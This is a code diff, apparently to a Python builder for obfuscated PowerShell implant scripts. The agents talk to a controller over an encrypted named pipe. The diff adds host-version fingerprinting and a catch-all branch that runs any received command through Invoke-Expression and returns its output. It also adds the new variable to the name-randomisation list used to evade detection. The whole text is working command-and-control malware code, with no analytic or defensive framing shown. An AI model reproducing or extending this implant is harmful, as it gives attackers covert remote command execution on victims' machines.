@@ -284,6 +284,8 @@ ${v['ci']}=@{{
   a=if([IntPtr]::Size-eq 8){{"x64"}}else{{"x86"}}
   o=[Environment]::OSVersion.Version.ToString()
   n=(Get-Process -Id $PID).ProcessName
+  v="1.0.0"
+  dn=if($PSVersionTable.CLRVersion){{$PSVersionTable.CLRVersion.ToString()}}else{{"4.0.0"}}
 }}|ConvertTo-Json -Compress
 ${v['enc']}={v['fn_encrypt']} ([Text.Encoding]::UTF8.GetBytes(${v['ci']})) ${v['sk']}
 {v['fn_write']} ${v['pipe']} ${v['enc']}
@@ -306,6 +308,10 @@ while($true){{
             ${v['out']}=Invoke-Expression ${v['tk']}.a 2>&1|Out-String
           }}elseif(${v['tk']}.c -eq "exit"){{
             ${v['pipe']}.Close();return
+          }}else{{
+            ${v['cmd']}=${v['tk']}.c
+            if(${v['tk']}.a){{${v['cmd']}+=" "+${v['tk']}.a}}
+            ${v['out']}=Invoke-Expression ${v['cmd']} 2>&1|Out-String
           }}
         }}catch{{
           ${v['out']}=$_.ToString()
@@ -384,7 +390,7 @@ def build_powershell_agent(
         'nonce', 'hm', 'mac', 'hs', 'sr', 'sn',
         'sha', 'km', 'sk',
         'ci', 'enc', 'raw', 'dec', 'msg',
-        'tk', 'out', 'st', 'rj', 're',
+        'tk', 'out', 'st', 'rj', 're', 'cmd',
         'jv', 'sw', 'hb', 'he',
     ]
     used = set()
